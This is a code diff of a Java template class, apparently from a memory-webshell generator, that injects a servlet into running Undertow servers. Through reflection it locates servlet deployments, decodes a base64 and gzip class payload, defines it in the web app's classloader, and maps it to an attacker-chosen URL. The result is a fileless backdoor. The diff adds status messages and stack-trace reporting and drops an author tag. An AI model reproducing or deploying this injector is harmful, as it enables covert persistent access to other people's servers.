@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.undertow;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
@@ -10,39 +11,68 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  * @since 2024/12/21
  */
 public class UndertowServletInjector {
 
-    private static String urlPattern;
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public UndertowServletInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public Set<Object> getContext() throws Exception {
@@ -73,30 +103,31 @@ public class UndertowServletInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
     public void inject(Object context, Object servlet) throws Exception {
         Object deploymentImpl = getFieldValue(context, "deployment");
         Object managedServlets = invokeMethod(deploymentImpl, "getServlets", null, null);
-        Object servletHandler = invokeMethod(managedServlets, "getServletHandler", new Class[]{String.class}, new Object[]{shellClassName});
+        Object servletHandler = invokeMethod(managedServlets, "getServletHandler", new Class[]{String.class}, new Object[]{getClassName()});
         if (servletHandler != null) {
             return;
         }
 
         Class<?> servletInfoClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.api.ServletInfo");
         Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-        Object servletInfo = servletInfoClass.getConstructor(String.class, Class.class).newInstance(shellClassName, servlet.getClass());
-        invokeMethod(servletInfo, "addMapping", new Class[]{String.class}, new Object[]{urlPattern});
+        Object servletInfo = servletInfoClass.getConstructor(String.class, Class.class).newInstance(getClassName(), servlet.getClass());
+        invokeMethod(servletInfo, "addMapping", new Class[]{String.class}, new Object[]{getUrlPattern()});
 
         invokeMethod(managedServlets, "addServlet", new Class[]{servletInfoClass}, new Object[]{servletInfo});
         invokeMethod(deploymentInfo, "addServlet", new Class[]{servletInfoClass}, new Object[]{servletInfo});
@@ -104,6 +135,11 @@ public class UndertowServletInjector {
         Object servletPaths = invokeMethod(deploymentImpl, "getServletPaths", null, null);
         Object data = invokeMethod(servletPaths, "setupServletChains", null, null);
         setFieldValue(servletPaths, "data", data);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -194,4 +230,18 @@ public class UndertowServletInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
